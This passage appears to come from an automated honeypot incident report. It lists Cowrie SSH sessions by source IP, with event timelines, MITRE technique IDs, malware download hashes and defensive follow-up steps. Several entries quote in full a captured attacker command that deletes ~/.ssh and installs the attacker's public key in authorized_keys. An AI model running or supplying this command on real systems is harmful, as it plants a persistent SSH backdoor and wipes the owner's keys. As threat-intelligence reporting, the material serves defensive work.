| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:34:11` | `cowrie.session.connect` |
| `2026-09-19 18:34:11` | `cowrie.client.version` |
| `2026-09-19 18:34:11` | `cowrie.client.kex` |
| `2026-09-19 18:34:13` | `cowrie.login.success` |
| `2026-09-19 18:34:14` | `cowrie.session.params` |
| `2026-09-19 18:34:14` | `cowrie.command.input` |
| `2026-09-19 18:34:14` | `cowrie.command.failed` |
| `2026-09-19 18:34:14` | `cowrie.log.closed` |
| `2026-09-19 18:34:15` | `cowrie.session.params` |
| `2026-09-19 18:34:15` | `cowrie.command.input` |
| `2026-09-19 18:39:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.155.106[.]101` to AbuseIPDB if not already reported
- [ ] Block `61.155.106[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-039015ab99bf

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-09-19 18:45 |
| **Last Seen** | 2026-09-19 18:46 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:45:41` | `cowrie.session.connect` |
| `2026-09-19 18:45:41` | `cowrie.client.version` |
| `2026-09-19 18:45:41` | `cowrie.client.kex` |
| `2026-09-19 18:45:42` | `cowrie.login.success` |
| `2026-09-19 18:45:50` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:45:55` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 18:45:55` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:46:00` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:46:02` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 18:46:02` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:46:10` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:46:17` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 18:46:17` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:46:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9059f896d171

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-19 18:51 |
| **Last Seen** | 2026-09-19 18:51 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:51:24` | `cowrie.session.connect` |
| `2026-09-19 18:51:24` | `cowrie.client.version` |
| `2026-09-19 18:51:24` | `cowrie.client.kex` |
| `2026-09-19 18:51:24` | `cowrie.login.success` |
| `2026-09-19 18:51:26` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:51:27` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 18:51:27` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:51:28` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:51:28` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 18:51:28` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:51:29` | `cowrie.direct-tcpip.request` |
| `2026-09-19 18:51:30` | `cowrie.direct-tcpip.ja4` |
| `2026-09-19 18:51:30` | `cowrie.direct-tcpip.data` |
| `2026-09-19 18:51:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12236730b70b

| Field | Detail |
|---|---|
| **Source IP** | `41.216.167[.]226` |
| **First Seen** | 2026-09-19 18:59 |
| **Last Seen** | 2026-09-19 18:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:59:31` | `cowrie.session.connect` |
| `2026-09-19 18:59:31` | `cowrie.client.version` |
| `2026-09-19 18:59:31` | `cowrie.client.kex` |
| `2026-09-19 18:59:32` | `cowrie.login.success` |
| `2026-09-19 18:59:32` | `cowrie.session.params` |
| `2026-09-19 18:59:32` | `cowrie.command.input` |
| `2026-09-19 18:59:32` | `cowrie.command.failed` |
| `2026-09-19 18:59:33` | `cowrie.log.closed` |
| `2026-09-19 18:59:34` | `cowrie.session.params` |
| `2026-09-19 18:59:34` | `cowrie.command.input` |
| `2026-09-19 18:59:34` | `cowrie.session.file_download` |
| `2026-09-19 18:59:34` | `cowrie.log.closed` |
| `2026-09-19 18:59:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.167[.]226` to AbuseIPDB if not already reported
- [ ] Block `41.216.167[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4fd702a3622

| Field | Detail |
|---|---|
| **Source IP** | `41.216.167[.]226` |
| **First Seen** | 2026-09-19 18:59 |
| **Last Seen** | 2026-09-19 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:59:34` | `cowrie.session.connect` |
| `2026-09-19 18:59:34` | `cowrie.client.version` |
| `2026-09-19 18:59:34` | `cowrie.client.kex` |
| `2026-09-19 18:59:35` | `cowrie.login.success` |
| `2026-09-19 18:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.167[.]226` to AbuseIPDB if not already reported
- [ ] Block `41.216.167[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5062df1cb649

| Field | Detail |
|---|---|
| **Source IP** | `41.216.167[.]226` |
| **First Seen** | 2026-09-19 18:59 |
| **Last Seen** | 2026-09-19 18:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 18:59:35` | `cowrie.session.connect` |
| `2026-09-19 18:59:35` | `cowrie.client.version` |
| `2026-09-19 18:59:35` | `cowrie.client.kex` |
| `2026-09-19 18:59:36` | `cowrie.login.success` |
| `2026-09-19 18:59:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.216.167[.]226` to AbuseIPDB if not already reported
- [ ] Block `41.216.167[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57a0f47acfc1

| Field | Detail |
|---|---|
| **Source IP** | `172.87.30[.]117` |
| **First Seen** | 2026-09-19 19:01 |
| **Last Seen** | 2026-09-19 19:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:01:03` | `cowrie.session.connect` |
| `2026-09-19 19:01:03` | `cowrie.client.version` |
| `2026-09-19 19:01:03` | `cowrie.client.kex` |
| `2026-09-19 19:01:03` | `cowrie.login.success` |
| `2026-09-19 19:01:04` | `cowrie.session.params` |
| `2026-09-19 19:01:04` | `cowrie.command.input` |
| `2026-09-19 19:01:04` | `cowrie.command.failed` |
| `2026-09-19 19:01:04` | `cowrie.log.closed` |
| `2026-09-19 19:01:05` | `cowrie.session.params` |
| `2026-09-19 19:01:05` | `cowrie.command.input` |
| `2026-09-19 19:01:05` | `cowrie.session.file_download` |
| `2026-09-19 19:01:05` | `cowrie.log.closed` |
| `2026-09-19 19:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.87.30[.]117` to AbuseIPDB if not already reported
- [ ] Block `172.87.30[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6b105b61045

| Field | Detail |
|---|---|
| **Source IP** | `172.87.30[.]117` |
| **First Seen** | 2026-09-19 19:01 |
| **Last Seen** | 2026-09-19 19:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:01:05` | `cowrie.session.connect` |
| `2026-09-19 19:01:05` | `cowrie.client.version` |
| `2026-09-19 19:01:05` | `cowrie.client.kex` |
| `2026-09-19 19:01:05` | `cowrie.login.success` |
| `2026-09-19 19:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.87.30[.]117` to AbuseIPDB if not already reported
- [ ] Block `172.87.30[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ef5d5069513

| Field | Detail |
|---|---|
| **Source IP** | `172.87.30[.]117` |
| **First Seen** | 2026-09-19 19:01 |
| **Last Seen** | 2026-09-19 19:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:01:05` | `cowrie.session.connect` |
| `2026-09-19 19:01:05` | `cowrie.client.version` |
| `2026-09-19 19:01:05` | `cowrie.client.kex` |
| `2026-09-19 19:01:06` | `cowrie.login.success` |
| `2026-09-19 19:01:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.87.30[.]117` to AbuseIPDB if not already reported
- [ ] Block `172.87.30[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dbf2765a4c3

| Field | Detail |
|---|---|
| **Source IP** | `14.225.207[.]152` |
| **First Seen** | 2026-09-19 19:02 |
| **Last Seen** | 2026-09-19 19:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:02:05` | `cowrie.session.connect` |
| `2026-09-19 19:02:05` | `cowrie.client.version` |
| `2026-09-19 19:02:05` | `cowrie.client.kex` |
| `2026-09-19 19:02:06` | `cowrie.login.success` |
| `2026-09-19 19:02:07` | `cowrie.session.params` |
| `2026-09-19 19:02:07` | `cowrie.command.input` |
| `2026-09-19 19:02:07` | `cowrie.command.failed` |
| `2026-09-19 19:02:08` | `cowrie.log.closed` |
| `2026-09-19 19:02:09` | `cowrie.session.params` |
| `2026-09-19 19:02:09` | `cowrie.command.input` |
| `2026-09-19 19:02:09` | `cowrie.session.file_download` |
| `2026-09-19 19:02:09` | `cowrie.log.closed` |
| `2026-09-19 19:02:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.207[.]152` to AbuseIPDB if not already reported
- [ ] Block `14.225.207[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18bab886267a

| Field | Detail |
|---|---|
| **Source IP** | `14.225.207[.]152` |
| **First Seen** | 2026-09-19 19:02 |
| **Last Seen** | 2026-09-19 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:02:09` | `cowrie.session.connect` |
| `2026-09-19 19:02:09` | `cowrie.client.version` |
| `2026-09-19 19:02:09` | `cowrie.client.kex` |
| `2026-09-19 19:02:10` | `cowrie.login.success` |
| `2026-09-19 19:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.207[.]152` to AbuseIPDB if not already reported
- [ ] Block `14.225.207[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95c50a6d91d9

| Field | Detail |
|---|---|
| **Source IP** | `14.225.207[.]152` |
| **First Seen** | 2026-09-19 19:02 |
| **Last Seen** | 2026-09-19 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:02:11` | `cowrie.session.connect` |
| `2026-09-19 19:02:11` | `cowrie.client.version` |
| `2026-09-19 19:02:11` | `cowrie.client.kex` |
| `2026-09-19 19:02:12` | `cowrie.login.success` |
| `2026-09-19 19:02:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.225.207[.]152` to AbuseIPDB if not already reported
- [ ] Block `14.225.207[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-105074b594b1

| Field | Detail |
|---|---|
| **Source IP** | `49.247.37[.]22` |
| **First Seen** | 2026-09-19 19:02 |
| **Last Seen** | 2026-09-19 19:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:02:17` | `cowrie.session.connect` |
| `2026-09-19 19:02:17` | `cowrie.client.version` |
| `2026-09-19 19:02:17` | `cowrie.client.kex` |
| `2026-09-19 19:02:18` | `cowrie.login.success` |
| `2026-09-19 19:02:19` | `cowrie.session.params` |
| `2026-09-19 19:02:19` | `cowrie.command.input` |
| `2026-09-19 19:02:19` | `cowrie.command.failed` |
| `2026-09-19 19:02:20` | `cowrie.log.closed` |
| `2026-09-19 19:02:20` | `cowrie.session.params` |
| `2026-09-19 19:02:20` | `cowrie.command.input` |
| `2026-09-19 19:02:21` | `cowrie.session.file_download` |
| `2026-09-19 19:02:21` | `cowrie.log.closed` |
| `2026-09-19 19:02:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.247.37[.]22` to AbuseIPDB if not already reported
- [ ] Block `49.247.37[.]22` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28042b8ef351

| Field | Detail |
|---|---|
| **Source IP** | `49.247.37[.]22` |
| **First Seen** | 2026-09-19 19:02 |
| **Last Seen** | 2026-09-19 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:02:21` | `cowrie.session.connect` |
| `2026-09-19 19:02:21` | `cowrie.client.version` |
| `2026-09-19 19:02:21` | `cowrie.client.kex` |
| `2026-09-19 19:02:22` | `cowrie.login.success` |
| `2026-09-19 19:02:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.247.37[.]22` to AbuseIPDB if not already reported
- [ ] Block `49.247.37[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1397db74a979

| Field | Detail |
|---|---|
| **Source IP** | `49.247.37[.]22` |
| **First Seen** | 2026-09-19 19:02 |
| **Last Seen** | 2026-09-19 19:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:02:22` | `cowrie.session.connect` |
| `2026-09-19 19:02:22` | `cowrie.client.version` |
| `2026-09-19 19:02:23` | `cowrie.client.kex` |
| `2026-09-19 19:02:23` | `cowrie.login.success` |
| `2026-09-19 19:02:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.247.37[.]22` to AbuseIPDB if not already reported
- [ ] Block `49.247.37[.]22` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d961b52e820

| Field | Detail |
|---|---|
| **Source IP** | `182.48.68[.]82` |
| **First Seen** | 2026-09-19 19:04 |
| **Last Seen** | 2026-09-19 19:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:04:06` | `cowrie.session.connect` |
| `2026-09-19 19:04:06` | `cowrie.client.version` |
| `2026-09-19 19:04:06` | `cowrie.client.kex` |
| `2026-09-19 19:04:07` | `cowrie.login.success` |
| `2026-09-19 19:04:08` | `cowrie.session.params` |
| `2026-09-19 19:04:08` | `cowrie.command.input` |
| `2026-09-19 19:04:08` | `cowrie.command.failed` |
| `2026-09-19 19:04:09` | `cowrie.log.closed` |
| `2026-09-19 19:04:10` | `cowrie.session.params` |
| `2026-09-19 19:04:10` | `cowrie.command.input` |
| `2026-09-19 19:04:10` | `cowrie.session.file_download` |
| `2026-09-19 19:04:10` | `cowrie.log.closed` |
| `2026-09-19 19:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.48.68[.]82` to AbuseIPDB if not already reported
- [ ] Block `182.48.68[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92116e324a89

| Field | Detail |
|---|---|
| **Source IP** | `182.48.68[.]82` |
| **First Seen** | 2026-09-19 19:04 |
| **Last Seen** | 2026-09-19 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:04:10` | `cowrie.session.connect` |
| `2026-09-19 19:04:10` | `cowrie.client.version` |
| `2026-09-19 19:04:11` | `cowrie.client.kex` |
| `2026-09-19 19:04:12` | `cowrie.login.success` |
| `2026-09-19 19:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.48.68[.]82` to AbuseIPDB if not already reported
- [ ] Block `182.48.68[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce35a816e01e

| Field | Detail |
|---|---|
| **Source IP** | `182.48.68[.]82` |
| **First Seen** | 2026-09-19 19:04 |
| **Last Seen** | 2026-09-19 19:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:04:12` | `cowrie.session.connect` |
| `2026-09-19 19:04:12` | `cowrie.client.version` |
| `2026-09-19 19:04:12` | `cowrie.client.kex` |
| `2026-09-19 19:04:14` | `cowrie.login.success` |
| `2026-09-19 19:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.48.68[.]82` to AbuseIPDB if not already reported
- [ ] Block `182.48.68[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-effd600fac65

| Field | Detail |
|---|---|
| **Source IP** | `172.160.227[.]37` |
| **First Seen** | 2026-09-19 19:06 |
| **Last Seen** | 2026-09-19 19:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-19 19:06:22` | `cowrie.session.connect` |
| `2026-09-19 19:06:22` | `cowrie.client.version` |
| `2026-09-19 19:06:22` | `cowrie.client.kex` |
| `2026-09-19 19:06:23` | `cowrie.login.success` |
| `2026-09-19 19:06:24` | `cowrie.session.params` |
| `2026-09-19 19:06:24` | `cowrie.command.input` |
| `2026-09-19 19:06:24` | `cowrie.command.failed` |
| `2026-09-19 19:06:24` | `cowrie.log.closed` |
| `2026-09-19 19:06:24` | `cowrie.session.params` |
| `2026-09-19 19:06:24` | `cowrie.command.input` |
| `2026-09-19 19:06:25` | `cowrie.session.file_download` |
| `2026-09-19 19:06:25` | `cowrie.log.closed` |
| `2026-09-19 19:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.160.227[.]37` to AbuseIPDB if not already reported
- [ ] Block `172.160.227[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4e9371fa8a0

| Field | Detail |
|---|---|
